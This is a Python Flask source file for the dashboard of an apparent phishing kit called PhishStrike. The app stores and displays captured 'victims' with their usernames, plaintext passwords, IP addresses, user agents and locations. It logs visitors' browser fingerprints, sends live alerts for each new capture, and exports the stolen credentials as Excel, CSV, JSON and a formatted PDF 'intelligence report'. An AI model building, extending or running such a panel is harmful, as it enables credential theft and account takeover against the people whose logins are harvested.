"""
PhishStrike - Dashboard Flask Application
"""

import sys
import os
import io
import math
from datetime import datetime

from flask import Flask, render_template, jsonify, send_file, request
from flask_socketio import SocketIO

sys.path.append(os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__)))))
from phishstrike.core import database
from phishstrike.core.config import Config
from phishstrike.lib.logger import get_logger

log = get_logger("Dashboard")

app = Flask(__name__)
app.config["SECRET_KEY"] = Config.SECRET_KEY

_cors = Config.cors_origin_list() or "*"
socketio = SocketIO(app, cors_allowed_origins=_cors, async_mode="threading")


def _validate_internal_key():
    return request.headers.get("X-Internal-Key") == Config.internal_api_key()


def _emit_refresh():
    socketio.emit("new_victim", {"status": "refresh"})


@app.route("/")
def index():
    return render_template("index.html")


# ─── API Endpoints ─────────────────────────────────────────────────────────────

@app.route("/api/victims")
def get_victims():
    victims = database.get_all_victims()
    data = [
        {
            "id": v[0],
            "platform": v[1],
            "username": v[2],
            "password": v[3],
            "ip": v[4],
            "timestamp": v[5],
            "ua": v[6] if v[6] else "Unknown",
            "location": v[7] if v[7] else "Unknown",
        }
        for v in victims
    ]
    return jsonify(data)


@app.route("/api/stats")
def get_stats():
    return jsonify(database.get_stats())


@app.route("/api/delete/<int:victim_id>", methods=["POST"])
def delete_victim(victim_id):
    try:
        database.delete_victim(victim_id)
        log.info(f"Victim #{victim_id} deleted")
        return jsonify({"status": "success"})
    except Exception as e:
        log.error(f"Failed to delete victim #{victim_id}: {e}")
        return jsonify({"status": "error", "message": str(e)}), 500


@app.route("/api/delete_all", methods=["POST"])
def delete_all_victims():
    try:
        database.clear_all_victims()
        log.warning("All victims cleared")
        return jsonify({"status": "success"})
    except Exception as e:
        log.error(f"Failed to clear all victims: {e}")
        return jsonify({"status": "error", "message": str(e)}), 500


@app.route("/api/reset_ids", methods=["POST"])
def reset_ids():
    try:
        database.reset_ids()
        log.info("All IDs reset to start from 1")
        return jsonify({"status": "success"})
    except Exception as e:
        log.error(f"Failed to reset IDs: {e}")
        return jsonify({"status": "error", "message": str(e)}), 500


@app.route("/api/log_fingerprint", methods=["POST"])
def log_fingerprint():
    try:
        data = request.get_json()
        ip = request.remote_addr
        database.add_fingerprint(
            data.get("os"),
            data.get("browser"),
            data.get("screen_width"),
            data.get("screen_height"),
            data.get("language"),
            data.get("time_zone"),
            ip
        )
        log.info(f"Fingerprint logged: {data.get('os')} - {ip}")
        socketio.emit("new_fingerprint", data)
        return jsonify({"status": "success"})
    except Exception as e:
        log.error(f"Failed to log fingerprint: {e}")
        return jsonify({"status": "error", "message": str(e)}), 500


@app.route("/api/fingerprints")
def get_fingerprints():
    try:
        fingerprints = database.get_all_fingerprints()
        return jsonify(fingerprints)
    except Exception as e:
        log.error(f"Failed to get fingerprints: {e}")
        return jsonify({"status": "error", "message": str(e)}), 500


@app.route("/api/delete_fingerprint/<int:fingerprint_id>", methods=["POST"])
def delete_fingerprint(fingerprint_id):
    try:
        database.delete_fingerprint(fingerprint_id)
        log.info(f"Fingerprint #{fingerprint_id} deleted")
        return jsonify({"status": "success"})
    except Exception as e:
        log.error(f"Failed to delete fingerprint #{fingerprint_id}: {e}")
        return jsonify({"status": "error", "message": str(e)}), 500


@app.route("/api/delete_all_fingerprints", methods=["POST"])
def delete_all_fingerprints():
    try:
        database.clear_all_fingerprints()
        log.warning("All fingerprints cleared")
        return jsonify({"status": "success"})
    except Exception as e:
        log.error(f"Failed to clear all fingerprints: {e}")
        return jsonify({"status": "error", "message": str(e)}), 500


@app.route("/api/reset_fingerprint_ids", methods=["POST"])
def reset_fingerprint_ids():
    try:
        database.reset_fingerprint_ids()
        log.info("Fingerprint IDs reset to start from 1")
        return jsonify({"status": "success"})
    except Exception as e:
        log.error(f"Failed to reset fingerprint IDs: {e}")
        return jsonify({"status": "error", "message": str(e)}), 500


@app.route("/api/export")
def export_excel():
    try:
        import pandas as pd

        victims = database.get_all_victims()
        df = pd.DataFrame(
            victims,
            columns=[
                "ID", "Platform", "Username/Email", "Password", "Source IP",
                "Captured At", "User Agent", "Location",
            ],
        )
        filename = f"phishstrike_intelligence_{datetime.now().strftime('%Y%m%d_%H%M%S')}.xlsx"
        path = os.path.join(
            os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__)))),
            "auth",
            filename,
        )
        df.to_excel(path, index=False)
        log.info(f"Excel export generated: {filename}")
        return send_file(path, as_attachment=True, download_name=filename)
    except ImportError:
        return jsonify({"status": "error", "message": "pandas not installed"}), 500
    except Exception as e:
        log.error(f"Excel export failed: {e}")
        return jsonify({"status": "error", "message": str(e)}), 500


@app.route("/api/export_csv")
def export_csv():
    try:
        victims = database.get_all_victims()
        lines = ["ID,Platform,Username/Email,Password,Source IP,Captured At,User Agent,Location"]
        for v in victims:
            row = [str(x).replace(",", ";") if x else "" for x in v]
            lines.append(",".join(row))
        csv_content = "\n".join(lines)
        buf = io.BytesIO(csv_content.encode("utf-8"))
        filename = f"phishstrike_intelligence_{datetime.now().strftime('%Y%m%d_%H%M%S')}.csv"
        log.info(f"CSV export generated: {filename}")
        return send_file(buf, as_attachment=True, download_name=filename, mimetype="text/csv")
    except Exception as e:
        log.error(f"CSV export failed: {e}")
        return jsonify({"status": "error", "message": str(e)}), 500


@app.route("/api/export_pdf")
def export_pdf():
    try:
        from fpdf import FPDF

        victims = database.get_all_victims()
        stats = database.get_stats()

        class PDF(FPDF):
            def header(self):
                self.set_fill_color(15, 23, 42)
                self.rect(0, 0, 297, 40, 'F')
                self.set_font("Helvetica", "B", 24)
                self.set_text_color(59, 130, 246)
                self.set_xy(0, 15)
                self.cell(0, 10, "PHISHSTRIKE INTELLIGENCE REPORT", 0, 1, "C")
                self.set_font("Helvetica", "", 10)
                self.set_text_color(200, 200, 200)
                self.cell(0, 8, f"Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}", 0, 1, "C")
                self.set_y(38)
                self.set_fill_color(59, 130, 246)
                self.rect(0, 38, 297, 2, 'F')
                self.ln(10)

            def footer(self):
                self.set_y(-15)
                self.set_fill_color(15, 23, 42)
                self.rect(0, 282, 297, 15, 'F')
                self.set_font("Helvetica", "I", 8)
                self.set_text_color(200, 200, 200)
                self.cell(0, 10, f"Page {self.page_no()} | PhishStrike © 2025", 0, 0, "C")

        pdf = PDF()
        pdf.set_auto_page_break(auto=True, margin=10)
        pdf.add_page(orientation='L')
        pdf.set_margins(10, 10, 10)
        pdf.set_font("Helvetica", "B", 16)
        pdf.set_text_color(59, 130, 246)
        pdf.cell(0, 12, "EXECUTIVE SUMMARY", 0, 1)
        pdf.ln(5)
        pdf.set_fill_color(30, 41, 59)
        pdf.set_draw_color(59, 130, 246)
        box_y = pdf.get_y()
        pdf.rect(10, box_y, 277, 35, 'FD')
        pdf.set_xy(15, box_y + 12)
        pdf.set_font("Helvetica", "", 12)
        pdf.set_text_color(255, 255, 255)
        summary_data = [
            ("Total Infiltrations", str(stats["total"])),
            ("Platforms Targeted", str(len(stats["platforms"]))),
            ("Report Generated", datetime.now().strftime('%Y-%m-%d %H:%M:%S')),
        ]
        x_pos = 15
        for label, value in summary_data:
            pdf.set_xy(x_pos, box_y + 12)
            pdf.set_font("Helvetica", "B", 11)
            pdf.cell(0, 10, f"{label}:", 0, 0)
            pdf.set_font("Helvetica", "", 11)
            pdf.cell(0, 10, f" {value}", 0, 0)
            x_pos += 95
        pdf.ln(25)
        pdf.set_font("Helvetica", "B", 16)
        pdf.set_text_color(59, 130, 246)
        pdf.cell(0, 12, "PLATFORM DISTRIBUTION", 0, 1)
        pdf.ln(5)
        pdf.set_fill_color(30, 41, 59)
        pdf.set_draw_color(59, 130, 246)
        box_y = pdf.get_y()
        pdf.rect(10, box_y, 277, 30, 'FD')
        pdf.set_xy(15, box_y + 10)
        pdf.set_font("Helvetica", "", 11)
        pdf.set_text_color(255, 255, 255)
        x_pos = 15
        for platform, count in stats["platforms"]:
            pdf.set_xy(x_pos, box_y + 10)
            pdf.cell(0, 10, f"{platform}: {count} credentials", 0, 0)
            x_pos += 140
        pdf.ln(22)
        pdf.set_font("Helvetica", "B", 14)
        pdf.set_text_color(59, 130, 246)
        pdf.cell(0, 10, "COLLECTED INTELLIGENCE", 0, 1)
        pdf.ln(5)
        pdf.set_font("Helvetica", "B", 9)
        pdf.set_text_color(255, 255, 255)
        pdf.set_fill_color(30, 41, 59)
        pdf.set_draw_color(59, 130, 246)
        headers = [
            ("ID", 8), ("Platform", 30), ("Username/Email", 71),
            ("Password", 71), ("Source IP", 48), ("Captured At", 48),
        ]
        col_widths = [w for (_, w) in headers]
        for header, width in headers:
            pdf.cell(width, 8, header, 1, 0, "C", True)
        pdf.ln()
        pdf.set_draw_color(59, 130, 246)
        table_width = sum(col_widths)
        table_x = 10
        table_y = pdf.get_y() - 8
        pdf.rect(table_x, table_y, table_width, 8, 'D')
        pdf.set_font("Helvetica", "", 9)
        pdf.set_text_color(0, 0, 0)
        line_h = 8

        def _fit_text(text, width, font_name="Helvetica", font_size=9):
            if text is None:
                return ''
            text = str(text)
            pdf.set_font(font_name, "", font_size)
            return text

        row_count = 0
        for v in victims:
            cells = [str(v[0]), str(v[1]), str(v[2]), (str(v[3]) if v[3] is not None else ''), str(v[4]), str(v[5])]
            if pdf.get_y() + line_h > pdf.h - pdf.b_margin:
                pdf.add_page(orientation='L')
                pdf.set_font("Helvetica", "B", 9)
                pdf.set_text_color(255, 255, 255)
                pdf.set_fill_color(30, 41, 59)
                for header, width in headers:
                    pdf.cell(width, 8, header, 1, 0, "C", True)
                pdf.ln()
                pdf.set_font("Helvetica", "", 9)
                pdf.set_text_color(0, 0, 0)
                row_count = 0
            if row_count % 2 == 0:
                pdf.set_fill_color(248, 250, 252)
            else:
                pdf.set_fill_color(255, 255, 255)
            for i, txt in enumerate(cells):
                w = col_widths[i]
                if i == 3:
                    fitted = _fit_text(txt, w, font_name="Courier", font_size=9)
                    pdf.set_font("Courier", "", 9)
                else:
                    fitted = _fit_text(txt, w, font_name="Helvetica", font_size=9)
                    pdf.set_font("Helvetica", "", 9)
                align = "C" if i in (0, 4, 5) else "L"
                pdf.cell(w, line_h, fitted, 1, 0, align, True)
            pdf.ln()
            row_count += 1
        buf = io.BytesIO(pdf.output())
        filename = f"phishstrike_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.pdf"
        log.info(f"PDF report generated: {filename}")
        return send_file(buf, as_attachment=True, download_name=filename, mimetype="application/pdf")
    except ImportError:
        return jsonify({"status": "error", "message": "fpdf2 not installed"}), 500
    except Exception as e:
        log.error(f"PDF export failed: {e}")
        return jsonify({"status": "error", "message": str(e)}), 500


@app.route("/api/export_json")
def export_json():
    try:
        import json

        victims = database.get_all_victims()
        data = [
            {
                "id": v[0],
                "platform": v[1],
                "username": v[2],
                "password": v[3],
                "source_ip": v[4],
                "captured_at": v[5],
                "user_agent": v[6] if v[6] else "Unknown",
                "location": v[7] if v[7] else "Unknown",
            }
            for v in victims
        ]
        json_content = json.dumps(data, indent=2)
        buf = io.BytesIO(json_content.encode("utf-8"))
        filename = f"phishstrike_intelligence_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        log.info(f"JSON export generated: {filename}")
        return send_file(buf, as_attachment=True, download_name=filename, mimetype="application/json")
    except Exception as e:
        log.error(f"JSON export failed: {e}")
        return jsonify({"status": "error", "message": str(e)}), 500


@app.route("/api/internal/refresh", methods=["GET", "POST"])
def internal_refresh():
    if not _validate_internal_key():
        return jsonify({"status": "error", "message": "invalid key"}), 403
    _emit_refresh()
    return jsonify({"status": "ok"})


@app.route("/api/refresh")
def refresh():
    _emit_refresh()
    return jsonify({"status": "ok"})


def notify_new_victim(data):
    socketio.emit("new_victim", data)


if __name__ == "__main__":
    database.init_db()

    if not os.environ.get("SECRET_KEY"):
        log.warning(
            "SECRET_KEY not set in .env — sessions reset on each restart. "
            "Copy .env.example to .env and set SECRET_KEY."
        )

    host = Config.DASHBOARD_HOST
    port = Config.DASHBOARD_PORT
    log.info(f"PhishStrike Dashboard starting on http://{host}:{port}")

    if Config.DASHBOARD_HOST == "0.0.0.0":
        log.warning(
            "DASHBOARD_HOST=0.0.0.0 exposes the panel on your network. "
            "Use 127.0.0.1 for local-only access."
        )

    if Config.DASHBOARD_RUNTIME == "waitress":
        try:
            from waitress import serve

            log.info("Runtime: Waitress (HTTP only — UI polls every 5s)")
            serve(app, host=host, port=port, threads=8)
        except ImportError:
            log.warning("Waitress not installed — falling back to SocketIO server.")
            socketio.run(
                app, host=host, port=port,
                debug=Config.DEBUG, allow_unsafe_werkzeug=True,
            )
    else:
        log.info("Runtime: Flask-SocketIO (live WebSocket updates)")
        socketio.run(
            app, host=host, port=port,
            debug=Config.DEBUG, allow_unsafe_werkzeug=True,
        )
